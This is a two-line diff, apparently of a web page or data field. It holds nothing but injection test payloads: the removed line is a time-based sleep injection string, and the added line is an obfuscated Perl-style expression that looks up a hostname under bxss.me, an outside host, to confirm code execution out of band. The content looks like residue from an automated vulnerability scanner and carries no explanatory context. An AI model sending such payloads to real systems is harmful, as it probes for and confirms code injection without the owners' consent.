@@ -1,2 +1,1 @@
-![](/wimage/MO_394669891912_001/Abc/m.jpg)
-"&&sleep(27*1000)*zfmswg&&"
+gethostbyname(lc('hitbg'.'orojxegm3bfac.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(110).chr(90).chr(109).chr(89)
